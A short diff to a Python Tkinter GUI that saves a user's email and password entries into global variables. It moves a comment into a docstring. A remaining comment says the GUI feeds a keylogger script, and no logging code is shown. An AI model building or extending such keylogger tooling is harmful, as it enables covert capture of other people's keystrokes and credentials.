@@ -29,8 +29,11 @@ def gui():
     submit = Button(text="Submit")
     submit.grid(row=9, column=1)
 
-    # Creating a function to save the users entry as a variable inorder to be used in users email and pasword function
+    
     def save3_var():
+        """Save the users entry as a variable inorder to be used in 
+           users email and pasword function 
+        """
         global var1, var2
 
         var1 = str(usr_email.get())
@@ -40,7 +43,6 @@ def gui():
 
     root.mainloop()
 
-# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 # creating a gui interface in a dunction to make it callable in the keylogger script
 
 
